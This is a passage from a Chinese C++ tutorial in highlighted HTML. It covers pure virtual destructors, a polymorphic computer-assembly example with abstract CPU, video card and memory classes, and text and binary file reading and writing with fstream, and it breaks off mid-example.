class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">Animal</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Animal 构造函数调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Speak</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//析构函数加上virtual关键字，变成虚析构函数</span><br><span class="hljs-comment">//virtual ~Animal()</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;Animal虚析构函数调用！&quot; &lt;&lt; endl;</span><br><span class="hljs-comment">//&#125;</span><br><br><br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Animal</span>() = <span class="hljs-number">0</span>;<br>&#125;;<br><br>Animal::~<span class="hljs-built_in">Animal</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Animal 纯虚析构函数调用！&quot;</span> &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//和包含普通纯虚函数的类一样，包含了纯虚析构函数的类也是一个抽象类。不能够被实例化。</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> : <span class="hljs-keyword">public</span> Animal &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Cat</span>(string name)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Cat构造函数调用！&quot;</span> &lt;&lt; endl;<br>m_Name = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(name);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; *m_Name &lt;&lt;  <span class="hljs-string">&quot;小猫在说话!&quot;</span> &lt;&lt; endl;<br>&#125;<br>~<span class="hljs-built_in">Cat</span>()<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Cat析构函数调用!&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;m_Name != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">delete</span> m_Name;<br>m_Name = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">public</span>:<br>string *m_Name;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Animal *animal = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Cat</span>(<span class="hljs-string">&quot;Tom&quot;</span>);<br>animal-&gt;<span class="hljs-built_in">Speak</span>();<br><br><span class="hljs-comment">//通过父类指针去释放，会导致子类对象可能清理不干净，造成内存泄漏</span><br><span class="hljs-comment">//怎么解决？给基类增加一个虚析构函数</span><br><span class="hljs-comment">//虚析构函数就是用来解决通过父类指针释放子类对象</span><br><span class="hljs-keyword">delete</span> animal;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ol><li><p>虚析构或纯虚析构就是用来解决通过父类指针释放子类对象</p></li><li><p>如果子类中没有堆区数据，可以不写为虚析构或纯虚析构</p></li><li><p>拥有纯虚析构函数的类也属于抽象类</p></li></ol><h4 id="4-7-6-多态案例三-电脑组装"><a href="#4-7-6-多态案例三-电脑组装" class="headerlink" title="4.7.6 多态案例三-电脑组装"></a>4.7.6 多态案例三-电脑组装</h4><p><strong>案例描述：</strong></p><p>电脑主要组成部件为 CPU（用于计算），显卡（用于显示），内存条（用于存储）</p><p>将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如Intel厂商和Lenovo厂商</p><p>创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口</p><p>测试时组装三台不同的电脑进行工作</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">//抽象CPU类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CPU</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//抽象的计算函数</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">calculate</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">//抽象显卡类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VideoCard</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//抽象的显示函数</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">//抽象内存条类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Memory</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//抽象的存储函数</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">storage</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">//电脑类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Computer</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Computer</span>(CPU * cpu, VideoCard * vc, Memory * mem)<br>&#123;<br>m_cpu = cpu;<br>m_vc = vc;<br>m_mem = mem;<br>&#125;<br><br><span class="hljs-comment">//提供工作的函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">work</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//让零件工作起来，调用接口</span><br>m_cpu-&gt;<span class="hljs-built_in">calculate</span>();<br><br>m_vc-&gt;<span class="hljs-built_in">display</span>();<br><br>m_mem-&gt;<span class="hljs-built_in">storage</span>();<br>&#125;<br><br><span class="hljs-comment">//提供析构函数 释放3个电脑零件</span><br>~<span class="hljs-built_in">Computer</span>()<br>&#123;<br><br><span class="hljs-comment">//释放CPU零件</span><br><span class="hljs-keyword">if</span> (m_cpu != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">delete</span> m_cpu;<br>m_cpu = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//释放显卡零件</span><br><span class="hljs-keyword">if</span> (m_vc != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">delete</span> m_vc;<br>m_vc = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//释放内存条零件</span><br><span class="hljs-keyword">if</span> (m_mem != <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">delete</span> m_mem;<br>m_mem = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br><br>CPU * m_cpu; <span class="hljs-comment">//CPU的零件指针</span><br>VideoCard * m_vc; <span class="hljs-comment">//显卡零件指针</span><br>Memory * m_mem; <span class="hljs-comment">//内存条零件指针</span><br>&#125;;<br><br><span class="hljs-comment">//具体厂商</span><br><span class="hljs-comment">//Intel厂商</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IntelCPU</span> :<span class="hljs-keyword">public</span> CPU<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">calculate</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Intel的CPU开始计算了！&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IntelVideoCard</span> :<span class="hljs-keyword">public</span> VideoCard<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Intel的显卡开始显示了！&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IntelMemory</span> :<span class="hljs-keyword">public</span> Memory<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">storage</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Intel的内存条开始存储了！&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-comment">//Lenovo厂商</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LenovoCPU</span> :<span class="hljs-keyword">public</span> CPU<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">calculate</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Lenovo的CPU开始计算了！&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LenovoVideoCard</span> :<span class="hljs-keyword">public</span> VideoCard<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Lenovo的显卡开始显示了！&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LenovoMemory</span> :<span class="hljs-keyword">public</span> Memory<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">storage</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Lenovo的内存条开始存储了！&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//第一台电脑零件</span><br>CPU * intelCpu = <span class="hljs-keyword">new</span> IntelCPU;<br>VideoCard * intelCard = <span class="hljs-keyword">new</span> IntelVideoCard;<br>Memory * intelMem = <span class="hljs-keyword">new</span> IntelMemory;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;第一台电脑开始工作：&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//创建第一台电脑</span><br>Computer * computer1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Computer</span>(intelCpu, intelCard, intelMem);<br>computer1-&gt;<span class="hljs-built_in">work</span>();<br><span class="hljs-keyword">delete</span> computer1;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;-----------------------&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;第二台电脑开始工作：&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//第二台电脑组装</span><br>Computer * computer2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Computer</span>(<span class="hljs-keyword">new</span> LenovoCPU, <span class="hljs-keyword">new</span> LenovoVideoCard, <span class="hljs-keyword">new</span> LenovoMemory);;<br>computer2-&gt;<span class="hljs-built_in">work</span>();<br><span class="hljs-keyword">delete</span> computer2;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;-----------------------&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;第三台电脑开始工作：&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//第三台电脑组装</span><br>Computer * computer3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Computer</span>(<span class="hljs-keyword">new</span> LenovoCPU, <span class="hljs-keyword">new</span> IntelVideoCard, <span class="hljs-keyword">new</span> LenovoMemory);;<br>computer3-&gt;<span class="hljs-built_in">work</span>();<br><span class="hljs-keyword">delete</span> computer3;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-文件操作"><a href="#5-文件操作" class="headerlink" title="5 文件操作"></a>5 文件操作</h2><p>程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放</p><p>通过<strong>文件可以将数据持久化</strong></p><p>C++中对文件操作需要包含头文件 <code>#include &lt;fstream&gt;</code></p><p>文件类型分为两种：</p><ol><li><strong>文本文件</strong>     -  文件以文本的<strong>ASCII码</strong>形式存储在计算机中</li><li><strong>二进制文件</strong> -  文件以文本的<strong>二进制</strong>形式存储在计算机中，用户一般不能直接读懂它们</li></ol><p>操作文件的三大类:</p><ol><li>ofstream：写操作</li><li>ifstream： 读操作</li><li>fstream ： 读写操作</li></ol><h3 id="5-1文本文件"><a href="#5-1文本文件" class="headerlink" title="5.1文本文件"></a>5.1文本文件</h3><h4 id="5-1-1写文件"><a href="#5-1-1写文件" class="headerlink" title="5.1.1写文件"></a>5.1.1写文件</h4><p>写文件步骤如下：</p><ol><li>包含头文件</li></ol><p><code>#include &lt;fstream&gt;</code></p><ol start="2"><li>创建流对象</li></ol><p><code>ofstream ofs;</code></p><ol start="3"><li>打开文件</li></ol><p><code>ofs.open(&quot;文件路径&quot;,打开方式);</code></p><ol start="4"><li>写数据</li></ol><p><code>ofs &lt;&lt; &quot;写入的数据&quot;;</code></p><ol start="5"><li>关闭文件</li></ol><p><code>ofs.close();</code></p><p>文件打开方式：</p><table><thead><tr><th>打开方式</th><th>解释</th></tr></thead><tbody><tr><td>ios::in</td><td>为读文件而打开文件</td></tr><tr><td>ios::out</td><td>为写文件而打开文件</td></tr><tr><td>ios::ate</td><td>初始位置：文件尾</td></tr><tr><td>ios::app</td><td>追加方式写文件</td></tr><tr><td>ios::trunc</td><td>如果文件存在先删除，再创建</td></tr><tr><td>ios::binary</td><td>二进制方式</td></tr></tbody></table><p><strong>注意：</strong> 文件打开方式可以配合使用，利用|操作符</p><p>**例如：**用二进制方式写文件 <code>ios::binary |  ios:: out</code></p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>ofstream ofs;<br>ofs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, ios::out);<br><br>ofs &lt;&lt; <span class="hljs-string">&quot;姓名：张三&quot;</span> &lt;&lt; endl;<br>ofs &lt;&lt; <span class="hljs-string">&quot;性别：男&quot;</span> &lt;&lt; endl;<br>ofs &lt;&lt; <span class="hljs-string">&quot;年龄：18&quot;</span> &lt;&lt; endl;<br><br>ofs.<span class="hljs-built_in">close</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>文件操作必须包含头文件 fstream</li><li>读文件可以利用 ofstream  ，或者fstream类</li><li>打开文件时候需要指定操作文件的路径，以及打开方式</li><li>利用&lt;&lt;可以向文件中写数据</li><li>操作完毕，要关闭文件</li></ul><h4 id="5-1-2读文件"><a href="#5-1-2读文件" class="headerlink" title="5.1.2读文件"></a>5.1.2读文件</h4><p>读文件与写文件步骤相似，但是读取方式相对于比较多</p><p>读文件步骤如下：</p><ol><li>包含头文件</li></ol><p><code> #include &lt;fstream&gt;</code></p><ol start="2"><li>创建流对象</li></ol><p><code>ifstream ifs;</code></p><ol start="3"><li>打开文件并判断文件是否打开成功</li></ol><p><code>ifs.open(&quot;文件路径&quot;,打开方式);</code></p><ol start="4"><li>读数据</li></ol><p>四种方式读取</p><ol start="5"><li><p>关闭文件</p><p><code>ifs.close();</code></p></li></ol><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>ifstream ifs;<br>ifs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, ios::in);<br><br><span class="hljs-keyword">if</span> (!ifs.<span class="hljs-built_in">is_open</span>())<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//第一种方式</span><br><span class="hljs-comment">//char buf[1024] = &#123; 0 &#125;;</span><br><span class="hljs-comment">//while (ifs &gt;&gt; buf)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//第二种</span><br><span class="hljs-comment">//char buf[1024] = &#123; 0 &#125;;</span><br><span class="hljs-comment">//while (ifs.getline(buf,sizeof(buf)))</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//第三种</span><br><span class="hljs-comment">//string buf;</span><br><span class="hljs-comment">//while (getline(ifs, buf))</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-type">char</span> c;<br><span class="hljs-keyword">while</span> ((c = ifs.<span class="hljs-built_in">get</span>()) != EOF)<br>&#123;<br>cout &lt;&lt; c;<br>&#125;<br><br>ifs.<span class="hljs-built_in">close</span>();<br><br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>读文件可以利用 ifstream  ，或者fstream类</li><li>利用is_open函数可以判断文件是否打开成功</li><li>close 关闭文件</li></ul><h3 id="5-2-二进制文件"><a href="#5-2-二进制文件" class="headerlink" title="5.2 二进制文件"></a>5.2 二进制文件</h3><p>以二进制的方式对文件进行读写操作</p><p>打开方式要指定为<code>ios::binary</code></p><h4 id="5-2-1-写文件"><a href="#5-2-1-写文件" class="headerlink" title="5.2.1 写文件"></a>5.2.1 写文件</h4><p>二进制方式写文件主要利用流对象调用成员函数write</p><p>函数原型 ：<code>ostream&amp; write(const char * buffer,int len);</code></p><p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">char</span> m_Name[<span class="hljs-number">64</span>];<br><span class="hljs-type">int</span> m_Age;<br>&#125;;<br><br><span class="hljs-comment">//二进制文件  写文件</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1、包含头文件</span><br><br><span class="hljs-comment">//2、创建输出流对象</span><br><span class="hljs-function">ofstream <span class="hljs-title">ofs</span><span class="hljs-params">(<span class="hljs-string">&quot;person.txt&quot;</span>, ios::out | ios::binary)</span></span>;<br><br><span class="hljs-comment">//3、打开文件</span><br><span class="hljs-comment">//ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);</span><br><br>Person p = &#123;<span class="hljs-string">&quot;张三&quot;</span>  , <span class="hljs-number">18</span>&#125;;<br><br><span class="hljs-comment">//4、写文件</span><br>ofs.<span class="hljs-built_in">write</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;p, <span class="hljs-built_in">sizeof</span>(p));<br><br><span class="hljs-comment">//5、关闭文件</span><br>ofs.<span class="hljs-built_in">close</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>文件输出流对象 可以通过write函数，以二进制方式写数据</li></ul><h4 id="5-2-2-读文件"><a href="#5-2-2-读文件" class="headerlink" title="5.2.2 读文件"></a>5.2.2 读文件</h4><p>二进制方式读文件主要利用流对象调用成员函数read</p><p>函数原型：<code>istream&amp; read(char *buffer,int len);</code></p><p>参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</p><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 